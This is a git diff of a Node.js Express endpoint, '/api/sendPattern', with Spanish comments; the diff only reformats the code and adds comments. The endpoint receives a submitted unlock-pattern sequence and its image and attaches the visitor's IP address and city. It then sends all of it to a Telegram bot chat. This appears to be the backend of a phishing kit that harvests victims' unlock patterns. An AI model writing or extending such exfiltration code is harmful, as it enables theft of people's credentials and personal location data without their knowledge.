@@ -167,20 +167,26 @@ app.post('/api/sendPattern', async (req, res) => {
   const caption = `🔒 Patrón recibido\nSecuencia: <code>${patron}</code>\n\nIP: ${ip}\nCiudad: ${city}`;
 
   try {
-    // Convertir la base64 en un buffer
+    // Convertir la imagen base64 en Buffer
     const base64Data = patronImg.replace(/^data:image\/png;base64,/, "");
     const buffer = Buffer.from(base64Data, "base64");
 
+    // Construir el form-data para Telegram
     const formData = new FormData();
     formData.append("chat_id", CHAT_ID);
-    formData.append("photo", buffer, { filename: "pattern.png", contentType: "image/png" });
+    formData.append("photo", buffer, {
+      filename: "pattern.png",
+      contentType: "image/png",
+    });
     formData.append("caption", caption);
     formData.append("parse_mode", "HTML");
 
-    const response = await axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, formData, {
-      headers: formData.getHeaders(),
-      httpsAgent: agent,
-    });
+    // Enviar a Telegram
+    const response = await axios.post(
+      `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`,
+      formData,
+      { headers: formData.getHeaders(), httpsAgent: agent }
+    );
 
     res.status(200).json({ success: true, data: response.data });
   } catch (error) {
